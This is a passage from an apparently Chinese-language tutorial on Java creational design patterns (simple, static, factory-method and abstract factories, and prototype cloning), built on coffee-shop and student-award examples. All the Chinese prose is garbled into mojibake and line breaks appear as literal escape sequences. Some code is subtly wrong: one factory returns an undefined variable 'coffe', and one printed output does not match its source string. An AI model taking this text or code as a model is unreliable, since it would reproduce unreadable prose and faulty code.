ï¼šå®šä¹‰äº†äº§å“çš„è§„èŒƒï¼Œæè¿°äº†äº§å“çš„ä¸»è¦ç‰¹æ€§å’ŒåŠŸèƒ½ã€‚\n* å…·ä½“äº§å“ ï¼šå®ç°æˆ–è€…ç»§æ‰¿æŠ½è±¡äº§å“çš„å­ç±»\n* å…·ä½“å·¥å‚ ï¼šæä¾›äº†åˆ›å»ºäº§å“çš„æ–¹æ³•ï¼Œè°ƒç”¨è€…é€šè¿‡è¯¥æ–¹æ³•æ¥è·å–äº§å“ã€‚\n\nç°åœ¨ä½¿ç”¨ç®€å•å·¥å‚å¯¹ä¸Šé¢æ¡ˆä¾‹è¿›è¡Œæ”¹è¿›ï¼Œç±»å›¾å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202211101706850.png)\n\n```java\npublic class SimpleCoffeeFactory {\n  \n    public Coffee createCoffee(String type) {\n        Coffee coffee = null;\n        if(\"americano\".equals(type)) {\n            coffee = new AmericanoCoffee();\n        } else if(\"latte\".equals(type)) {\n            coffee = new LatteCoffee();\n        }\n        return coffee;\n    }\n}\n```\n\nå¦‚æœè¦æ·»åŠ æ–°äº§å“ç›´æ¥ä¿®æ”¹å·¥å‚ç±»ï¼Œè€Œä¸éœ€è¦åœ¨åŸä»£ç ä¸­ä¿®æ”¹ï¼Œè¿™å°±é™ä½äº†å®¢æˆ·ä»£ç ä¿®æ”¹çš„å¯èƒ½æ€§ï¼Œæ›´æ˜“æ‰©å±•ã€‚\n\nå°è£…äº†åˆ›å»ºå¯¹è±¡çš„è¿‡ç¨‹ï¼Œå¯ä»¥é€šè¿‡å‚æ•°ç›´æ¥è·å–å¯¹è±¡ã€‚æŠŠå¯¹è±¡çš„åˆ›å»ºå’Œä¸šåŠ¡é€»è¾‘å±‚åˆ†å¼€ï¼Œè¿™æ ·ä»¥åå°±é¿å…äº†ä¿®æ”¹å®¢æˆ·ä»£ç ã€‚\n\nå·¥å‚å¤„ç†åˆ›å»ºå¯¹è±¡çš„ç»†èŠ‚ï¼š\n\nä¸€æ—¦æœ‰äº†SimpleCoffeeFactoryï¼ŒCoffeeStoreç±»ä¸­çš„orderCoffee()å°±å˜æˆæ­¤å¯¹è±¡çš„å®¢æˆ·ï¼ŒåæœŸå¦‚æœéœ€è¦Coffeeå¯¹è±¡ç›´æ¥ä»å·¥å‚ä¸­è·å–å³å¯ã€‚è¿™æ ·ä¹Ÿå°±è§£é™¤äº†CoffeeStoreå’ŒCoffeeå®ç°ç±»çš„è€¦åˆï¼Œä½†åŒæ—¶åˆäº§ç”Ÿäº†æ–°çš„è€¦åˆï¼ŒCoffeeStoreå¯¹è±¡å’ŒSimpleCoffeeFactoryå·¥å‚å¯¹è±¡çš„è€¦åˆï¼Œå·¥å‚å¯¹è±¡å’Œå•†å“å¯¹è±¡çš„è€¦åˆã€‚åæœŸå¦‚æœå†åŠ æ–°å“ç§çš„å’–å•¡ï¼Œæˆ‘ä»¬åŠ¿å¿…è¦éœ€æ±‚ä¿®æ”¹SimpleCoffeeFactoryçš„ä»£ç ï¼Œè¿åäº†å¼€é—­åŸåˆ™ã€‚\n\n**é™æ€å·¥å‚**\n\nåœ¨å¼€å‘ä¸­ä¹Ÿæœ‰ä¸€éƒ¨åˆ†äººå°†å·¥å‚ç±»ä¸­çš„åˆ›å»ºå¯¹è±¡çš„åŠŸèƒ½å®šä¹‰ä¸ºé™æ€çš„ï¼Œè¿™ä¸ªå°±æ˜¯é™æ€å·¥å‚æ¨¡å¼ã€‚\n\n```java\npublic class SimpleCoffeeFactory {\n\n    public static Coffee createCoffee(String type) {\n        Coffee coffee = null;\n        if(\"americano\".equals(type)) {\n            coffee = new AmericanoCoffee();\n        } else if(\"latte\".equals(type)) {\n            coffee = new LatteCoffee();\n        }\n        return coffe;\n    }\n}\n```\n\n### 2.å·¥å‚æ–¹æ³•æ¨¡å¼\n\né’ˆå¯¹ä¸Šä¾‹ä¸­çš„ç¼ºç‚¹ï¼Œä½¿ç”¨å·¥å‚æ–¹æ³•æ¨¡å¼å°±å¯ä»¥å®Œç¾çš„è§£å†³ï¼Œå®Œå…¨éµå¾ªå¼€é—­åŸåˆ™ã€‚å®šä¹‰ä¸€ä¸ªç”¨äºåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè®©å­ç±»å†³å®šå®ä¾‹åŒ–å“ªä¸ªäº§å“ç±»å¯¹è±¡ã€‚å·¥å‚æ–¹æ³•ä½¿ä¸€ä¸ªäº§å“ç±»çš„å®ä¾‹åŒ–å»¶è¿Ÿåˆ°å…¶å·¥å‚çš„å­ç±»ã€‚\n\nå·¥å‚æ–¹æ³•æ¨¡å¼çš„ä¸»è¦è§’è‰²ï¼š\n\n* æŠ½è±¡å·¥å‚ï¼šæä¾›äº†åˆ›å»ºäº§å“çš„æ¥å£ï¼Œè°ƒç”¨è€…é€šè¿‡å®ƒè®¿é—®å…·ä½“å·¥å‚çš„å·¥å‚æ–¹æ³•æ¥åˆ›å»ºäº§å“ã€‚\n* å…·ä½“å·¥å‚ï¼šä¸»è¦æ˜¯å®ç°æŠ½è±¡å·¥å‚ä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œå®Œæˆå…·ä½“äº§å“çš„åˆ›å»ºã€‚\n* æŠ½è±¡äº§å“ï¼šå®šä¹‰äº†äº§å“çš„è§„èŒƒï¼Œæè¿°äº†äº§å“çš„ä¸»è¦ç‰¹æ€§å’ŒåŠŸèƒ½ã€‚\n* å…·ä½“äº§å“ï¼šå®ç°äº†æŠ½è±¡äº§å“è§’è‰²æ‰€å®šä¹‰çš„æ¥å£ï¼Œç”±å…·ä½“å·¥å‚æ¥åˆ›å»ºï¼Œå®ƒåŒå…·ä½“å·¥å‚ä¹‹é—´ä¸€ä¸€å¯¹åº”ã€‚\n\n![](https://img.jwt1399.top/img/202211102132846.png)\n\næŠ½è±¡å·¥å‚ï¼š\n\n```java\npublic interface CoffeeFactory {\n    Coffee createCoffee();\n}\n```\n\nå…·ä½“å·¥å‚ï¼š\n\n```java\npublic class LatteCoffeeFactory implements CoffeeFactory {\n    public Coffee createCoffee() {\n        return new LatteCoffee();\n    }\n}\n\n\npublic class AmericanCoffeeFactory implements CoffeeFactory {\n    public Coffee createCoffee() {\n        return new AmericanCoffee();\n    }\n}\n```\n\nå’–å•¡åº—ç±»ï¼š\n\n```java\npublic class CoffeeStore {\n\n    private CoffeeFactory factory;\n\n    public CoffeeStore(CoffeeFactory factory) {\n        this.factory = factory;\n    }\n\n    public Coffee orderCoffee(String type) {\n        Coffee coffee = factory.createCoffee();\n        coffee.addMilk();\n        coffee.addsugar();\n        return coffee;\n    }\n}\n```\n\n**ä¼˜ç‚¹ï¼š**\n\n- ç”¨æˆ·åªéœ€è¦çŸ¥é“å…·ä½“å·¥å‚çš„åç§°å°±å¯å¾—åˆ°æ‰€è¦çš„äº§å“ï¼Œæ— é¡»çŸ¥é“äº§å“çš„å…·ä½“åˆ›å»ºè¿‡ç¨‹ï¼›\n- åœ¨ç³»ç»Ÿå¢åŠ æ–°äº§å“æ—¶åªéœ€è¦æ·»åŠ å…·ä½“äº§å“ç±»å’Œå¯¹åº”çš„å…·ä½“å·¥å‚ç±»ï¼Œæ— é¡»å¯¹åŸå·¥å‚è¿›è¡Œä¿®æ”¹ï¼Œæ»¡è¶³å¼€é—­åŸåˆ™ï¼›\n\n**ç¼ºç‚¹ï¼š**\n\n* æ¯å¢åŠ ä¸€ä¸ªäº§å“å°±è¦å¢åŠ ä¸€ä¸ªå…·ä½“äº§å“ç±»å’Œä¸€ä¸ªå¯¹åº”çš„å…·ä½“å·¥å‚ç±»ï¼Œè¿™å¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ã€‚\n\n### 3.æ¨¡å¼æ‰©å±•\n\nå¯ä»¥é€šè¿‡**å·¥å‚æ¨¡å¼+é…ç½®æ–‡ä»¶**çš„æ–¹å¼è§£é™¤å·¥å‚å¯¹è±¡å’Œäº§å“å¯¹è±¡çš„è€¦åˆã€‚åœ¨å·¥å‚ç±»ä¸­åŠ è½½é…ç½®æ–‡ä»¶ä¸­çš„å…¨ç±»åï¼Œå¹¶åˆ›å»ºå¯¹è±¡è¿›è¡Œå­˜å‚¨ï¼Œå®¢æˆ·ç«¯å¦‚æœéœ€è¦å¯¹è±¡ï¼Œç›´æ¥è¿›è¡Œè·å–å³å¯ã€‚\n\nç¬¬ä¸€æ­¥ï¼šå®šä¹‰é…ç½®æ–‡ä»¶\n\nä¸ºäº†æ¼”ç¤ºæ–¹ä¾¿ï¼Œæˆ‘ä»¬ä½¿ç”¨propertiesæ–‡ä»¶ä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œåç§°ä¸ºbean.properties\n\n```properties\namerican=com.itheima.pattern.factory.config_factory.AmericanCoffee\nlatte=com.itheima.pattern.factory.config_factory.LatteCoffee\n```\n\nç¬¬äºŒæ­¥ï¼šæ”¹è¿›å·¥å‚ç±»\n\n```java\npublic class CoffeeFactory {\n\n    private static Map<String,Coffee> map = new HashMap<>();\n\n    static {\n        Properties p = new Properties();\n        InputStream is = CoffeeFactory.class.getClassLoader().getResourceAsStream(\"bean.properties\");\n        try {\n            p.load(is);\n            //éå†Propertiesé›†åˆå¯¹è±¡\n            Set<Object> keys = p.keySet();\n            for (Object key : keys) {\n                //æ ¹æ®é”®è·å–å€¼ï¼ˆå…¨ç±»åï¼‰\n                String className = p.getProperty((String) key);\n                //è·å–å­—èŠ‚ç å¯¹è±¡\n                Class clazz = Class.forName(className);\n                Coffee obj = (Coffee) clazz.newInstance();\n                map.put((String)key,obj);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static Coffee createCoffee(String name) {\n\n        return map.get(name);\n    }\n}\n```\n\né™æ€æˆå‘˜å˜é‡ç”¨æ¥å­˜å‚¨åˆ›å»ºçš„å¯¹è±¡ï¼ˆé”®å­˜å‚¨çš„æ˜¯åç§°ï¼Œå€¼å­˜å‚¨çš„æ˜¯å¯¹åº”çš„å¯¹è±¡ï¼‰ï¼Œè€Œè¯»å–é…ç½®æ–‡ä»¶ä»¥åŠåˆ›å»ºå¯¹è±¡å†™åœ¨é™æ€ä»£ç å—ä¸­ï¼Œç›®çš„å°±æ˜¯åªéœ€è¦æ‰§è¡Œä¸€æ¬¡ã€‚\n\n> 1,DateForamtç±»ä¸­çš„getInstance()æ–¹æ³•ä½¿ç”¨çš„æ˜¯å·¥å‚æ¨¡å¼ï¼›\n>\n> 2,Calendarç±»ä¸­çš„getInstance()æ–¹æ³•ä½¿ç”¨çš„æ˜¯å·¥å‚æ¨¡å¼ï¼›\n>\n> 3,Collection.iteratoræ–¹æ³•ä½¿ç”¨çš„æ˜¯å·¥å‚æ¨¡å¼ï¼›\n\n## â¸æŠ½è±¡å·¥å‚æ¨¡å¼\n\næŠ½è±¡å·¥å‚æ¨¡å¼æ˜¯å·¥å‚æ–¹æ³•æ¨¡å¼çš„å‡çº§ç‰ˆæœ¬ï¼Œå·¥å‚æ–¹æ³•æ¨¡å¼åªç”Ÿäº§ä¸€ä¸ªç§ç±»çš„äº§å“ï¼Œè€ŒæŠ½è±¡å·¥å‚æ¨¡å¼å¯ç”Ÿäº§å¤šä¸ªç§ç±»çš„äº§å“ã€‚\n\næŠ½è±¡å·¥å‚æ¨¡å¼æ˜¯ä¸€ç§ä¸ºè®¿é—®ç±»æä¾›ä¸€ä¸ªåˆ›å»ºä¸€ç»„ç›¸å…³æˆ–ç›¸äº’ä¾èµ–å¯¹è±¡çš„æ¥å£ï¼Œä¸”è®¿é—®ç±»æ— é¡»æŒ‡å®šæ‰€è¦äº§å“çš„å…·ä½“ç±»å°±èƒ½å¾—åˆ°åŒæ—çš„ä¸åŒç­‰çº§çš„äº§å“çš„æ¨¡å¼ç»“æ„ã€‚\n\næœ¬èŠ‚è¦ä»‹ç»çš„æŠ½è±¡å·¥å‚æ¨¡å¼å°†è€ƒè™‘å¤šç­‰çº§äº§å“çš„ç”Ÿäº§ï¼Œå°†åŒä¸€ä¸ªå…·ä½“å·¥å‚æ‰€ç”Ÿäº§çš„ä½äºä¸åŒç­‰çº§çš„ä¸€ç»„äº§å“ç§°ä¸ºä¸€ä¸ªäº§å“æ—ï¼Œä¸‹å›¾æ‰€ç¤ºæ¨ªè½´æ˜¯äº§å“ç­‰çº§ï¼Œä¹Ÿå°±æ˜¯åŒä¸€ç±»äº§å“ï¼›çºµè½´æ˜¯äº§å“æ—ï¼Œä¹Ÿå°±æ˜¯åŒä¸€å“ç‰Œçš„äº§å“ï¼ŒåŒä¸€å“ç‰Œçš„äº§å“äº§è‡ªåŒä¸€ä¸ªå·¥å‚ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202211102132748.png\" style=\"zoom:67%;\" />\n\næŠ½è±¡å·¥å‚æ¨¡å¼çš„ä¸»è¦è§’è‰²å¦‚ä¸‹ï¼š\n\n* æŠ½è±¡å·¥å‚ï¼šæä¾›äº†åˆ›å»ºäº§å“çš„æ¥å£ï¼Œå®ƒåŒ…å«å¤šä¸ªåˆ›å»ºäº§å“çš„æ–¹æ³•ï¼Œå¯ä»¥åˆ›å»ºå¤šä¸ªä¸åŒç­‰çº§çš„äº§å“ã€‚\n* å…·ä½“å·¥å‚ï¼šä¸»è¦æ˜¯å®ç°æŠ½è±¡å·¥å‚ä¸­çš„å¤šä¸ªæŠ½è±¡æ–¹æ³•ï¼Œå®Œæˆå…·ä½“äº§å“çš„åˆ›å»ºã€‚\n* æŠ½è±¡äº§å“ï¼šå®šä¹‰äº†äº§å“çš„è§„èŒƒï¼Œæè¿°äº†äº§å“çš„ä¸»è¦ç‰¹æ€§å’ŒåŠŸèƒ½ï¼ŒæŠ½è±¡å·¥å‚æ¨¡å¼æœ‰å¤šä¸ªæŠ½è±¡äº§å“ã€‚\n* å…·ä½“äº§å“ï¼šå®ç°äº†æŠ½è±¡äº§å“è§’è‰²æ‰€å®šä¹‰çš„æ¥å£ï¼Œç”±å…·ä½“å·¥å‚æ¥åˆ›å»ºï¼Œå®ƒ åŒå…·ä½“å·¥å‚ä¹‹é—´æ˜¯å¤šå¯¹ä¸€çš„å…³ç³»ã€‚\n\nç°å’–å•¡åº—ä¸šåŠ¡å‘ç”Ÿæ”¹å˜ï¼Œä¸ä»…è¦ç”Ÿäº§å’–å•¡è¿˜è¦ç”Ÿäº§ç”œç‚¹ï¼Œå¦‚ææ‹‰ç±³è‹ã€æŠ¹èŒ¶æ…•æ–¯ç­‰ï¼Œè¦æ˜¯æŒ‰ç…§å·¥å‚æ–¹æ³•æ¨¡å¼ï¼Œéœ€è¦å®šä¹‰ææ‹‰ç±³è‹ç±»ã€æŠ¹èŒ¶æ…•æ–¯ç±»ã€ææ‹‰ç±³è‹å·¥å‚ã€æŠ¹èŒ¶æ…•æ–¯å·¥å‚ã€ç”œç‚¹å·¥å‚ç±»ï¼Œå¾ˆå®¹æ˜“å‘ç”Ÿç±»çˆ†ç‚¸æƒ…å†µã€‚\n\nå…¶ä¸­æ‹¿é“å’–å•¡ã€ç¾å¼å’–å•¡æ˜¯ä¸€ä¸ªäº§å“ç­‰çº§ï¼Œéƒ½æ˜¯å’–å•¡ï¼›ææ‹‰ç±³è‹ã€æŠ¹èŒ¶æ…•æ–¯ä¹Ÿæ˜¯ä¸€ä¸ªäº§å“ç­‰çº§ï¼›\n\næ‹¿é“å’Œææ‹‰ç±³è‹æ˜¯åŒä¸€äº§å“æ—ï¼ˆéƒ½å±äºæ„å¤§åˆ©é£å‘³ï¼‰ï¼Œç¾å¼å’ŒæŠ¹èŒ¶æ…•æ–¯æ˜¯åŒä¸€äº§å“æ—ï¼ˆéƒ½å±äºç¾å¼é£å‘³ï¼‰ã€‚\n\næ‰€ä»¥è¿™ä¸ªæ¡ˆä¾‹å¯ä»¥ä½¿ç”¨æŠ½è±¡å·¥å‚æ¨¡å¼å®ç°ã€‚\n\n![](https://img.jwt1399.top/img/202211102132449.png)\n\næŠ½è±¡å·¥å‚ï¼š\n\n```java\npublic interface DessertFactory {\n\n    Coffee createCoffee();\n\n    Dessert createDessert();\n}\n```\n\nå…·ä½“å·¥å‚ï¼š\n\n```java\n//ç¾å¼ç”œç‚¹å·¥å‚\npublic class AmericanDessertFactory implements DessertFactory {\n\n    public Coffee createCoffee() {\n        return new AmericanCoffee();\n    }\n\n    public Dessert createDessert() {\n        return new MatchaMousse();\n    }\n}\n//æ„å¤§åˆ©é£å‘³ç”œç‚¹å·¥å‚\npublic class ItalyDessertFactory implements DessertFactory {\n\n    public Coffee createCoffee() {\n        return new LatteCoffee();\n    }\n\n    public Dessert createDessert() {\n        return new Tiramisu();\n    }\n}\n```\n\nå¦‚æœè¦åŠ åŒä¸€ä¸ªäº§å“æ—çš„è¯ï¼Œåªéœ€è¦å†åŠ ä¸€ä¸ªå¯¹åº”çš„å·¥å‚ç±»å³å¯ï¼Œä¸éœ€è¦ä¿®æ”¹å…¶ä»–çš„ç±»ã€‚\n\n**ä¼˜ç‚¹ï¼š**\n\nå½“ä¸€ä¸ªäº§å“æ—ä¸­çš„å¤šä¸ªå¯¹è±¡è¢«è®¾è®¡æˆä¸€èµ·å·¥ä½œæ—¶ï¼Œå®ƒèƒ½ä¿è¯å®¢æˆ·ç«¯å§‹ç»ˆåªä½¿ç”¨åŒä¸€ä¸ªäº§å“æ—ä¸­çš„å¯¹è±¡ã€‚\n\n**ç¼ºç‚¹ï¼š**\n\nå½“äº§å“æ—ä¸­éœ€è¦å¢åŠ ä¸€ä¸ªæ–°çš„äº§å“æ—¶ï¼Œæ‰€æœ‰çš„å·¥å‚ç±»éƒ½éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚\n\n**ä½¿ç”¨åœºæ™¯ï¼š**\n\n* å½“éœ€è¦åˆ›å»ºçš„å¯¹è±¡æ˜¯ä¸€ç³»åˆ—ç›¸äº’å…³è”æˆ–ç›¸äº’ä¾èµ–çš„äº§å“æ—æ—¶ï¼Œå¦‚ç”µå™¨å·¥å‚ä¸­çš„ç”µè§†æœºã€æ´—è¡£æœºã€ç©ºè°ƒç­‰ã€‚\n\n* ç³»ç»Ÿä¸­æœ‰å¤šä¸ªäº§å“æ—ï¼Œä½†æ¯æ¬¡åªä½¿ç”¨å…¶ä¸­çš„æŸä¸€æ—äº§å“ã€‚å¦‚æœ‰äººåªå–œæ¬¢ç©¿æŸä¸€ä¸ªå“ç‰Œçš„è¡£æœå’Œé‹ã€‚\n\n* ç³»ç»Ÿä¸­æä¾›äº†äº§å“çš„ç±»åº“ï¼Œä¸”æ‰€æœ‰äº§å“çš„æ¥å£ç›¸åŒï¼Œå®¢æˆ·ç«¯ä¸ä¾èµ–äº§å“å®ä¾‹çš„åˆ›å»ºç»†èŠ‚å’Œå†…éƒ¨ç»“æ„ã€‚\n\n## â¹åŸå‹æ¨¡å¼\n\nç”¨ä¸€ä¸ªå·²ç»åˆ›å»ºçš„å®ä¾‹ä½œä¸ºåŸå‹ï¼Œé€šè¿‡å¤åˆ¶è¯¥åŸå‹å¯¹è±¡æ¥åˆ›å»ºä¸€ä¸ªå’ŒåŸå‹å¯¹è±¡ç›¸åŒçš„æ–°å¯¹è±¡ã€‚\n\nåŸå‹æ¨¡å¼åŒ…å«å¦‚ä¸‹è§’è‰²ï¼š\n\n* æŠ½è±¡åŸå‹ç±»ï¼šè§„å®šäº†å…·ä½“åŸå‹å¯¹è±¡å¿…é¡»å®ç°çš„çš„ clone() æ–¹æ³•ã€‚\n* å…·ä½“åŸå‹ç±»ï¼šå®ç°æŠ½è±¡åŸå‹ç±»çš„ clone() æ–¹æ³•ï¼Œå®ƒæ˜¯å¯è¢«å¤åˆ¶çš„å¯¹è±¡ã€‚\n* è®¿é—®ç±»ï¼šä½¿ç”¨å…·ä½“åŸå‹ç±»ä¸­çš„ clone() æ–¹æ³•æ¥å¤åˆ¶æ–°çš„å¯¹è±¡ã€‚\n\n![](https://img.jwt1399.top/img/202211102133633.png)\n\nåŸå‹æ¨¡å¼çš„å…‹éš†åˆ†ä¸ºæµ…å…‹éš†å’Œæ·±å…‹éš†ã€‚\n\n- æµ…å…‹éš†ï¼šåˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œæ–°å¯¹è±¡çš„å±æ€§å’ŒåŸæ¥å¯¹è±¡å®Œå…¨ç›¸åŒï¼Œå¯¹äºéåŸºæœ¬ç±»å‹å±æ€§ï¼Œä»æŒ‡å‘åŸæœ‰å±æ€§æ‰€æŒ‡å‘çš„å¯¹è±¡çš„å†…å­˜åœ°å€ã€‚\n\n- æ·±å…‹éš†ï¼šåˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œå±æ€§ä¸­å¼•ç”¨çš„å…¶ä»–å¯¹è±¡ä¹Ÿä¼šè¢«å…‹éš†ï¼Œä¸å†æŒ‡å‘åŸæœ‰å¯¹è±¡åœ°å€ã€‚\n\n### 1.æµ…å…‹éš†\n\nJavaä¸­çš„Objectç±»ä¸­æä¾›äº† `clone()` æ–¹æ³•æ¥å®ç°æµ…å…‹éš†ã€‚ Cloneable æ¥å£æ˜¯ä¸Šé¢çš„ç±»å›¾ä¸­çš„æŠ½è±¡åŸå‹ç±»ï¼Œè€Œå®ç°äº†Cloneableæ¥å£çš„å®ç°ç±»å°±æ˜¯å…·ä½“çš„åŸå‹ç±»ã€‚ä»£ç å¦‚ä¸‹ï¼š\n\n**Realizetypeï¼ˆå…·ä½“åŸå‹ç±»ï¼‰ï¼š**\n\n```java\npublic class Realizetype implements Cloneable {\n\n    public Realizetype() {\n        System.out.println(\"å…·ä½“çš„åŸå‹å¯¹è±¡åˆ›å»ºå®Œæˆï¼\");\n    }\n\n    @Override\n    protected Realizetype clone() throws CloneNotSupportedException {\n        System.out.println(\"å…·ä½“åŸå‹å¤åˆ¶æˆåŠŸï¼\");\n        return (Realizetype) super.clone();\n    }\n}\n```\n\n**PrototypeTestï¼ˆæµ‹è¯•è®¿é—®ç±»ï¼‰ï¼š**\n\n```java\npublic class PrototypeTest {\n    public static void main(String[] args) throws CloneNotSupportedException {\n        Realizetype r1 = new Realizetype();\n        Realizetype r2 = r1.clone();\n\n        System.out.println(\"å¯¹è±¡r1å’Œr2æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Ÿ\" + (r1 == r2));\n    }\n}\n/**\n*å…·ä½“çš„åŸå‹å¯¹è±¡åˆ›å»ºå®Œæˆï¼\n*å…·ä½“åŸå‹å¤åˆ¶æˆåŠŸï¼\n*å¯¹è±¡r1å’Œr2æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Ÿfalse\n*/\n```\n\n**ä½¿ç”¨åœºæ™¯**\n\n* å¯¹è±¡çš„åˆ›å»ºéå¸¸å¤æ‚ï¼Œå¯ä»¥ä½¿ç”¨åŸå‹æ¨¡å¼å¿«æ·çš„åˆ›å»ºå¯¹è±¡ã€‚\n* æ€§èƒ½å’Œå®‰å…¨è¦æ±‚æ¯”è¾ƒé«˜ã€‚\n\n**æ¡ˆä¾‹ï¼šç”¨åŸå‹æ¨¡å¼ç”Ÿæˆâ€œä¸‰å¥½å­¦ç”Ÿâ€å¥–çŠ¶**\n\nåŒä¸€å­¦æ ¡çš„â€œä¸‰å¥½å­¦ç”Ÿâ€å¥–çŠ¶é™¤äº†è·å¥–äººå§“åä¸åŒï¼Œå…¶ä»–éƒ½ç›¸åŒï¼Œå¯ä»¥ä½¿ç”¨åŸå‹æ¨¡å¼å¤åˆ¶å¤šä¸ªâ€œä¸‰å¥½å­¦ç”Ÿâ€å¥–çŠ¶å‡ºæ¥ï¼Œç„¶ååœ¨ä¿®æ”¹å¥–çŠ¶ä¸Šçš„åå­—å³å¯ã€‚\n\n![](https://img.jwt1399.top/img/202211102139269.png)\n\nä»£ç å¦‚ä¸‹ï¼š\n\n```java\n//å¥–çŠ¶ç±»\npublic class Citation implements Cloneable {\n    private String name;\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return (this.name);\n    }\n\n    public void show() {\n        System.out.println(name + \"åŒå­¦ï¼šåœ¨2022å­¦å¹´ç¬¬ä¸€å­¦æœŸä¸­è¡¨ç°ä¼˜ç§€ï¼Œè¢«è¯„ä¸ºä¸‰å¥½å­¦ç”Ÿã€‚ç‰¹å‘æ­¤çŠ¶ï¼\");\n    }\n\n    @Override\n    public Citation clone() throws CloneNotSupportedException {\n        return (Citation) super.clone();\n    }\n}\n\n//æµ‹è¯•è®¿é—®ç±»\npublic class CitationTest {\n    public static void main(String[] args) throws CloneNotSupportedException {\n        Citation c1 = new Citation();\n        c1.setName(\"å¼ ä¸‰\");\n\n        //å¤åˆ¶å¥–çŠ¶\n        Citation c2 = c1.clone();\n        //å°†å¥–çŠ¶çš„åå­—ä¿®æ”¹æå››\n        c2.setName(\"æå››\");\n\n        c1.show();\n        c2.show();\n    }\n}\n/**\n*å¼ ä¸‰åŒå­¦ï¼šåœ¨2020å­¦å¹´ç¬¬ä¸€å­¦æœŸä¸­è¡¨ç°ä¼˜ç§€ï¼Œè¢«è¯„ä¸ºä¸‰å¥½å­¦ç”Ÿã€‚ç‰¹å‘æ­¤çŠ¶ï¼\n*æå››åŒå­¦ï¼šåœ¨2020å­¦å¹´ç¬¬ä¸€å­¦æœŸä¸­è¡¨ç°ä¼˜ç§€ï¼Œè¢«è¯„ä¸ºä¸‰å¥½å­¦ç”Ÿã€‚ç‰¹å‘æ­¤çŠ¶ï¼\n*/\n```\n\n### 2.æ·±å…‹éš†\n\nå°†ä¸Šé¢çš„â€œä¸‰å¥½å­¦ç”Ÿâ€å¥–çŠ¶çš„æ¡ˆä¾‹ä¸­Citationç±»çš„nameå±æ€§ä¿®æ”¹ä¸ºStudentç±»å‹çš„å±æ€§ã€‚ä»£ç å¦‚ä¸‹ï¼š\n\n```java\n//å¥–çŠ¶ç±»\npublic class Citation implements Cloneable {\n    private Student stu;\n\n    public Student getStu() {\n        return stu;\n    }\n\n    public void setStu(Student stu) {\n        this.stu = stu;\n    }\n\n    void show() {\n        System.out.println(stu.getName() + \"åŒå­¦ï¼šåœ¨2020å­¦å¹´ç¬¬ä¸€å­¦æœŸä¸­è¡¨ç°ä¼˜ç§€ï¼Œè¢«è¯„ä¸ºä¸‰å¥½å­¦ç”Ÿã€‚ç‰¹å‘æ­¤çŠ¶ï¼\");\n    }\n\n    @Override\n    public Citation clone() throws CloneNotSupportedException {\n        return (Citation) super.clone();\n    }\n}\n\n//å­¦ç”Ÿç±»\npublic class Student {\n    private String name;\n    private String address;\n\n    public Student(String name, String address) {\n        this.name = name;\n        this.address = address;\n    }\n\n    public Student() {\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n}\n\n//æµ‹è¯•ç±»\npublic class CitationTest {\n    public static void main(String[] args) throws CloneNotSupportedException {\n\n        Citation c1 = new Citation();\n        Student stu = new Student(\"å¼ ä¸‰\", \"è¥¿å®‰\");\n        c1.setStu(stu);\n\n        //å¤åˆ¶å¥–çŠ¶\n        Citation c2 = c1.clone();\n        //è·å–c2å¥–çŠ¶æ‰€å±å­¦ç”Ÿå¯¹è±¡\n        Student stu1 = c2.getStu();\n        stu1.setName(\"æå››\");\n\n        //åˆ¤æ–­stuå¯¹è±¡å’Œstu1å¯¹è±¡æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¯¹è±¡\n        System.out.println(\"stuå’Œstu1æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Ÿ\" + (stu == stu1));\n\n        c1.show();\n        c2.show();\n    }\n}\n\n/**\n*stuå’Œstu1æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Ÿtrue\n*æå››åŒå­¦ï¼šåœ¨2020å­¦å¹´ç¬¬ä¸€å­¦æœŸä¸­è¡¨ç°ä¼˜ç§€ï¼Œè¢«è¯„ä¸ºä¸‰å¥½å­¦ç”Ÿã€‚ç‰¹å‘æ­¤çŠ¶ï¼\n*æå››åŒå­¦ï¼šåœ¨2020å­¦å¹´ç¬¬ä¸€å­¦æœŸä¸­è¡¨ç°ä¼˜ç§€ï¼Œè¢«è¯„ä¸ºä¸‰å¥½å­¦ç”Ÿã€‚ç‰¹å‘æ­¤çŠ¶ï¼\n*/\n```\n\nstuå¯¹è±¡å’Œstu1å¯¹è±¡æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œå°±ä¼šäº§ç”Ÿå°†stu1å¯¹è±¡ä¸­nameå±æ€§å€¼æ”¹ä¸ºâ€œæå››â€ï¼Œä¸¤ä¸ªCitationï¼ˆå¥–çŠ¶ï¼‰å¯¹è±¡ä¸­æ˜¾ç¤ºçš„éƒ½æ˜¯æå››ã€‚è¿™å°±æ˜¯æµ…å…‹éš†çš„æ•ˆæœï¼Œå¯¹å…·ä½“åŸå‹ç±»ï¼ˆCitationï¼‰ä¸­çš„å¼•ç”¨ç±»å‹çš„å±æ€§è¿›è¡Œå¼•ç”¨çš„å¤åˆ¶ã€‚è¿™ç§æƒ…å†µéœ€è¦ä½¿ç”¨æ·±å…‹éš†ï¼Œè€Œè¿›è¡Œæ·±å…‹éš†éœ€è¦ä½¿ç”¨å¯¹è±¡æµã€‚ä»£ç å¦‚ä¸‹ï¼š\n\n```java\npublic class CitationTest1 {\n    public static void main(String[] args) throws Exception {\n        Citation c1 = new Citation();\n        Student stu = new Student(\"å¼ ä¸‰\", \"è¥¿å®‰\");\n        c1.setStu(stu);\n\n        //åˆ›å»ºå¯¹è±¡è¾“å‡ºæµå¯¹è±¡\n        ObjectOutputStream oos = new 